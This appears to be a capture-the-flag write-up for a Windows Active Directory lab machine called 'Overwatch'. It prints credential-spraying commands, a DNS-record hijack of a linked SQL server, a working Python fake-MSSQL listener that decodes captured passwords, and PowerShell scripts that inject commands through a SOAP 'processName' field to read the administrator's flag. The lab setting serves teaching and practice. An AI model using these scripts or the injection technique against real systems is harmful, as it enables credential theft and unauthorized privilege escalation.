---
layout: post
title:  "Overwatch"
date:   2026-03-05 20:30:00 -0400
categories: HTB-machine windows medium
tags: HTB CTF writeup 
image:
    path: assets/img/htb/overwatch/banner.png
---

## Recon

Let's scan the target first.

```bash
nmap -sC -sV -Pn -T4 10.129.2.75

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
...
DNS_Computer_Name: S200401.overwatch.htb
```

The default scan misses some ports, so I scanned all of them and checked the new ones:

```bash
nmap -p- -Pn -T4 10.129.2.75
nmap -sC -sV -Pn -p 6520,9389,49664,49668,52495,52510,55655,58993,58994 10.129.2.75

6520/tcp  open  ms-sql-s   Microsoft SQL Server 2022 16.00.1000.00
```

## SMB

The `software$` share is open to anonymous users, so let's look inside.

```bash
smbclient -N -L //10.129.2.75
smbclient -N //10.129.2.75/software$ -c 'recurse on;prompt off;ls'

Sharename       Type
---------       ----
software$       Disk
...
\Monitoring
  overwatch.exe
  overwatch.exe.config
  overwatch.pdb
```

There is a monitoring app in the share. I downloaded it and looked at the strings, and it has hardcoded SQL credentials:

```bash
mkdir -p ~/Downloads/htb_overwatch
cd ~/Downloads/htb_overwatch
smbclient -N //10.129.2.75/software$ -c 'cd Monitoring;get overwatch.exe.config;get overwatch.exe;get overwatch.pdb'
strings -el overwatch.exe | head -n 300

Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

The credential is `overwatch.htb\sqlsvc : TI0LKcfHzZw1Vv`.

Let's see where `sqlsvc` works:

```bash
nxc smb 10.129.2.75 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'
nxc ldap 10.129.2.75 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'
nxc rdp 10.129.2.75 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'
nxc winrm 10.129.2.75 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'

SMB  [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
LDAP [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
RDP  [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
WINRM [-] ...
```

`sqlsvc` is a valid domain account, but we can't get a WinRM shell with it.

## SQL linked server

So we log in to MSSQL with it:

```bash
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.2.75 -windows-auth -port 6520
```

Inside the SQL shell:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_linkedservers;

SYSTEM_USER = OVERWATCH\sqlsvc
IS_SRVROLEMEMBER('sysadmin') = 0
Linked Server:
- S200401\SQLEXPRESS
- SQL07
```

`SQL07` is the one we will go after.

## DNS record

With `bloodyAD` we can check what `sqlsvc` can write in AD:

```bash
~/.local/bin/bloodyAD -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' -H 10.129.2.75 get writable

distinguishedName: DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb
permission: CREATE_CHILD
```

So we can add a DNS record that points `SQL07` to our machine:

```bash
~/.local/bin/bloodyAD -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' -H 10.129.2.75 add dnsRecord SQL07 10.10.14.87

[+] SQL07 has been successfully added
```

## Capture the linked server login

`Responder` needed root here, so I wrote a small fake MSSQL listener that reads the cleartext login. This is `responder_like_mssql.py`:

```python
#!/usr/bin/env python3
import socket,struct
PRELOGIN = bytes.fromhex('0401002500000100000015000601001b000102001c000103001d0000ff09000fc300000200')

def parse_cleartext(data):
    cno=struct.unpack('<h',data[44:46])[0]; cnl=struct.unpack('<h',data[46:48])[0]
    uno=struct.unpack('<h',data[48:50])[0]; unl=struct.unpack('<h',data[50:52])[0]
    pwo=struct.unpack('<h',data[52:54])[0]; pwl=struct.unpack('<h',data[54:56])[0]
    sno=struct.unpack('<h',data[60:62])[0]; snl=struct.unpack('<h',data[62:64])[0]
    dbo=struct.unpack('<h',data[76:78])[0]; dbl=struct.unpack('<h',data[78:80])[0]
    b=data
    user=b[8+uno:8+uno+unl*2].replace(b'\x00',b'').decode('latin-1',errors='ignore')
    pwd_obf=b[8+pwo:8+pwo+pwl*2].replace(b'\x00',b'')
    pw=''
    for x in pwd_obf:
        y=(x ^ 0xa5)
        hx=hex(y)[::-1][:2].replace('x','0')
        try: pw += bytes.fromhex(hx).decode('latin-1')
        except: pass
    server=b[8+sno:8+sno+snl*2].replace(b'\x00',b'').decode('latin-1',errors='ignore')
    db=b[8+dbo:8+dbo+dbl*2].replace(b'\x00',b'').decode('latin-1',errors='ignore')
    return user,pw,server,db

s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',1433));s.listen(5)
print('[*] listening 1433',flush=True)
while True:
    c,a=s.accept();print('[*] conn',a,flush=True)
    try:
        d=c.recv(4096)
        if not d: c.close(); continue
        print('[*] first byte',d[:1].hex(),'len',len(d),flush=True)
        c.sendall(PRELOGIN)
        d2=c.recv(4096)
        if not d2:
            print('[-] no second',flush=True); c.close(); continue
        print('[*] second byte',d2[:1].hex(),'len',len(d2),flush=True)
        if d2[:1]==b'\x10' and b'NTLMSSP' not in d2:
            u,p,srv,db=parse_cleartext(d2)
            print(f'[+] cleartext user={u} pass={p} server={srv} db={db}',flush=True)
        else:
            print('[*] second not cleartext login',flush=True)
    except Exception as e:
        print('err',e,flush=True)
    c.close()
```

Run the listener:

```bash
python3 responder_like_mssql.py
```

Then make the linked server connect to us from the SQL shell:

```sql
SELECT * FROM OPENQUERY(SQL07,'SELECT SYSTEM_USER');

[*] conn ('10.129.2.75', 54193)
[*] first byte 12 len 88
[*] second byte 10 len 240
[+] cleartext user=sqlmgmt pass=bIhBbzMMnB82yx server=SQL07 db=
```

The credential is `overwatch.htb\sqlmgmt : bIhBbzMMnB82yx`.

## User flag

This account can get a WinRM shell:

```bash
nxc smb 10.129.2.75 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
nxc winrm 10.129.2.75 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'

SMB   [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx
WINRM [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```

Now we can read the user flag:

```bash
nxc winrm 10.129.2.75 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx' -x "type C:\\Users\\sqlmgmt\\Desktop\\user.txt"
```

## Root

From the WinRM shell (`evil-winrm`) we can look at the local monitoring service API:

```powershell
iwr -UseBasicParsing http://localhost:8000/MonitorService?wsdl | select -ExpandProperty Content
iwr -UseBasicParsing http://localhost:8000/MonitorService?xsd=xsd0 | select -ExpandProperty Content
```

The WSDL shows these methods:
- `StartMonitoring`
- `StopMonitoring`
- `KillProcess`

The XSD shows:

```xml
<xs:element name="KillProcess">
  <xs:complexType>
    <xs:sequence>
      <xs:element minOccurs="0" name="processName" nillable="true" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```

From `overwatch.exe`, the service builds this PowerShell command:

- `Stop-Process -Name <processName> -Force`

`processName` goes straight into the command, so we can inject our own command through it.

First a test to see who runs our command. This is `killprocess_inject.ps1`:

```powershell
$payload='abc;whoami | Out-File C:\Windows\Temp\poc.txt;#'
$xml = "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'><s:Body><KillProcess xmlns='http://tempuri.org/'><processName>$payload</processName></KillProcess></s:Body></s:Envelope>"
$h=@{SOAPAction='"http://tempuri.org/IMonitoringService/KillProcess"'}
try {
  $r = Invoke-WebRequest -UseBasicParsing -Uri 'http://localhost:8000/MonitorService' -Method POST -Headers $h -ContentType 'text/xml; charset=utf-8' -Body $xml
  "STATUS=$($r.StatusCode)"
  $r.Content
} catch {
  "ERR=$($_.Exception.Message)"
}
if (Test-Path C:\Windows\Temp\poc.txt) {
  'POC_CONTENT:'
  Get-Content C:\Windows\Temp\poc.txt
} else {
  'POC_MISSING'
}
```

Upload and run it:

```text
evil-winrm -i 10.129.2.75 -u sqlmgmt -p 'bIhBbzMMnB82yx'
upload killprocess_inject.ps1
powershell -ep bypass -File C:\Users\sqlmgmt\Documents\killprocess_inject.ps1
```

This is what came back:

```text
STATUS=200
...
Test-Path : Access is denied
```

The SOAP request returns success, but `sqlmgmt` gets access denied on `C:\Windows\Temp\poc.txt`. So our command ran as a more privileged user.

Now we use the same injection to copy the root flag. This is `killprocess_root.ps1`:

```powershell
$payload='abc;Get-Content C:\Users\Administrator\Desktop\root.txt | Out-File C:\Users\sqlmgmt\Documents\root.txt;#'
$xml = "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'><s:Body><KillProcess xmlns='http://tempuri.org/'><processName>$payload</processName></KillProcess></s:Body></s:Envelope>"
$h=@{SOAPAction='"http://tempuri.org/IMonitoringService/KillProcess"'}
try {
  $r = Invoke-WebRequest -UseBasicParsing -Uri 'http://localhost:8000/MonitorService' -Method POST -Headers $h -ContentType 'text/xml; charset=utf-8' -Body $xml
  "STATUS=$($r.StatusCode)"
} catch {
  "ERR=$($_.Exception.Message)"
}
if (Test-Path C:\Users\sqlmgmt\Documents\root.txt) {
  'ROOT_CONTENT:'
  Get-Content C:\Users\sqlmgmt\Documents\root.txt
} else {
  'ROOT_MISSING'
}
```

Upload and run it:

```text
evil-winrm -i 10.129.2.75 -u sqlmgmt -p 'bIhBbzMMnB82yx'
upload killprocess_root.ps1
powershell -ep bypass -File C:\Users\sqlmgmt\Documents\killprocess_root.ps1
```
